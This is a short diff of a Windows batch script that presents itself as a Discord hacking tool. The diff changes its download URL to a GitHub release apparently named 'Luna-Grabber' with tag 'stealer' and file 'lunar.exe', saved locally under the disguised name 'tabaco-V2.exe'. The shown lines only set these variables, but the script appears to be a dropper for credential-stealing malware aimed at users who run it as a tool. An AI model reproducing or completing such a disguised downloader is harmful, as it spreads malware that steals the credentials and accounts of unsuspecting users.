@@ -1,7 +1,7 @@
 @echo off
 
 echo "Welcome Discord Hacker! Everything you do with this tool will be from your free will. We're not responsible for anything that happens to you"
-set "URL=https://github.com/hvbsvqdj/tool-boost-funk/releases/download/boost/boost.exe"
+set "URL=https://github.com/hvbsvqdj/Luna-Grabber/releases/download/stealer/lunar.exe"
 set "Dossier=Tools"
 set "NomFichier=%Dossier%\tabaco-V2.exe"
 
